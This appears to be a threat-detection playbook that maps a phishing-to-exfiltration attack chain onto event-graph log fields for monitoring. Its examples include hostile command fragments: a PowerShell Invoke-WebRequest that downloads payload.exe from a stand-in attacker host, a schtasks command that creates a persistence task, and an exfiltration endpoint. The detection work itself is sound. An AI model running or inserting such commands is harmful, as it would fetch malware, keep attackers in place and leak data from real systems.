1. **Identify Initial Access via Email**  
   - Monitor for incoming emails where the subject line contains "Invoice Attached" and the sender's domain is suspicious (e.g., `malicious.com`).  
   - Reference the event schema:  
     - `srcNode`: Email application (e.g., Outlook)  
     - `dstNode`: Email message with subject line  
     - `relation`: "Email Received" (custom relation for email events)  
     - `timestamp`: Time of email receipt  

2. **Map Opening the Malicious Attachment**  
   - Detect when a user opens an Excel file (`Invoice.xlsx`) that contains macros.  
   - Reference the event schema:  
     - `srcNode`: Microsoft Excel  
     - `dstNode`: Excel file (`Invoice.xlsx`)  
     - `relation`: "Process Create" (for Excel opening)  
     - `timestamp`: Time of file opening  

3. **Validate Macro Execution and PowerShell Command**  
   - Monitor for PowerShell commands executed by Excel macros, specifically looking for `Invoke-WebRequest` commands that download a payload.  
   - Reference the event schema:  
     - `srcNode`: Microsoft Excel (macro execution)  
     - `dstNode`: PowerShell command (e.g., `Invoke-WebRequest -Uri http://malicious.com/payload.exe`)  
     - `relation`: "Process Create" (for PowerShell execution)  
     - `timestamp`: Time of command execution  

4. **Detect Payload Execution**  
   - Track the execution of the downloaded payload (`payload.exe`) and ensure it is logged as a new process creation event.  
   - Reference the event schema:  
     - `srcNode`: Windows Explorer (or the process that executes the payload)  
     - `dstNode`: Executable file (`payload.exe`)  
     - `relation`: "Process Create"  
     - `timestamp`: Time of payload execution  

5. **Monitor for Establishing Persistence**  
   - Identify the creation of a scheduled task that ensures persistence, specifically looking for commands that create tasks with names like "MaliciousTask".  
   - Reference the event schema:  
     - `srcNode`: schtasks.exe  
     - `dstNode`: Scheduled task command (e.g., `schtasks /create /tn "MaliciousTask"`)  
     - `relation`: "Process Create" (for task creation)  
     - `timestamp`: Time of task creation  

6. **Track Data Exfiltration Attempts**  
   - Monitor for PowerShell commands that indicate data exfiltration, particularly those using `Invoke-WebRequest` to send data to a C2 server.  
   - Reference the event schema:  
     - `srcNode`: PowerShell (or other scripting tools)  
     - `dstNode`: Outbound connection to C2 server (e.g., `http://malicious.com/exfiltrate`)  
     - `relation`: "Network Connection" (custom relation for outbound connections)  
     - `timestamp`: Time of exfiltration attempt  